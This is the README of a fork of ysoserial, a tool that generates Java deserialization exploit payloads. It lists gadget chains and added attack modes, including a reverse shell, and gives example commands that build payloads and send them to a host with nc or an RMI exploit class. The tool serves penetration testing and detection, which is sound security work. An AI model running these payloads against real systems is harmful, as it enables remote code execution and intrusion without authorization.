
# ysoserial

[![Join the chat at https://gitter.im/frohoff/ysoserial](
    https://badges.gitter.im/frohoff/ysoserial.svg)](
    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## federicodotta Mod

This is a fork of the official great ysoserial project with some improvements I added to create payloads for the Burp Suite plugin [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) and more generally to speed-up and improve the detection and the exploitation of Java serialization issues with ysoserial. 

I will not execute a pull requests to the main plugin because some of my changes can't be applied to all the ysoserial plugin, because they require the execution of arbitrary Java code and many plugins execute other tasks (file upload, execution of EL estressions, ...). In these situations, obviously, the modified version can execute the original ysoserial payload (all original features should work correctly). 

I will try to update periodically this fork, in order to maintein it updated with ysoserial codebase. The fork should be fully compatible with tools that require ysoserial because if the arguments I added are not supplied, the tool should default to ysoserial original behaviour.

Same ysoserial disclaimer applies here and I don't guarantee at all the absence of bugs in this fork! Use it at your own risk and if you doubt on some behaviours try also with the original ysoserial.

**ysoserial improvements:**

*	Generation of serialized objects with different types of payloads (*exec_global, exec_win, exec_unix, sleep, dns, reverse_shell*) that improve the detection and exploitation of the serialization issues. *reverse_shell* has been extracted by *Nicky Bloor* ysoserial [pull request](https://github.com/frohoff/ysoserial/pull/96).
*	ysoserial output can be directly encoded using one or more transformations (*base64, base64_url_safe, url_encoding, ascii_hex, gzip, zlib*), supplied comma-separated
*	ysoserial can output XML XStream objects, instead of standard binary ones. The code has been extracted by *Isaac Sears* ysoserial [pull request](https://github.com/frohoff/ysoserial/pull/76)

Check next *Usage* sub-chapter for details.

# Usage

This is ysoserial default usage:

java -jar ysoserial-[version]-all.jar [payload] '[command]'

This is the usage of my fork:

java -jar ysoserial-fd-[version].jar [payload] '[command]' **[attack_type] [payload_transformations]**

The two added arguments are optional. Withtout supplying them it default to ysoserial original behaviour.

**Attack types:**

*	exec_global: it is the default mode, the one used by ysoserial. Usually it execute a Java exec with the supplied command, but in the plugins that don't allow code execution (like file upload) this option can be used to execute the default plugin task (like file upload). I could have chosen a better name, I know :) . Code execution is executed with *java.lang.Runtime.exec(command)*. If you are using a payload that supports only this option and not the *exec_win*/*exec_unix* ones, you can transform your commands using this [great online resource by Jackson](http://www.jackson-t.ca/runtime-exec-payloads.html) for better results!
*	exec_win: ysoserial default execution mode have some limitations in the chars that can be used in the commmand (redirections as an example don't work properly) that could make your commands fail (and usually these issues are blind...). *exec_win* attack type generates a payload that should support all cmd characters on Windows systems. It execute the Java expression *java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/C\",command})*
*	exec_unix: same for *exec_win* but for Linux/Unix targets: *java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",command})*
*	sleep: this option executes a native Java sleep, that is *synchronous*, differently from a sleep executed through a shell command that usually is *asynchronous* and consequenlty useless for the detection of serialization issues. The option execute the Java expression *java.lang.Thread.sleep(command)*
*	dns: this option executes a native Java DNS resolution. The difference between this option and URLDNS payload is that this option is executed exploiting a particular exploit chain: URLDNS says "The endpoint deserialize Java objects but I don't know if it is exploitable", this option says "The endpoint deserialize Java objects and it should be exploitable using this particular chain". The option execute the  Java expression *java.net.InetAddress.getByName(command)*
*	reverse_shell: this option generate a native Java reverse shell. The command has been created by NickstaDB and is supported only in payloads that use TemplatesImpl

**Available transformations:**

*	xstream (if xstream is chosen other transformations will be discarded)
*	base64
*	base64_url_safe
*	url_encoding
*	ascii_hex
*	gzip
*	zlib

Multiple transformations can be supplied comma-separated. An example is *base64,url_encoding*. If the transformation list includes xstream, the payload will be generated using XStream library and **no other transformations will be applied**.


## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        http://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

1. Download the latest jar from
[JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

Note that GitHub-hosted releases were removed in compliance with the
[GitHub Community Guidelines](
    https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
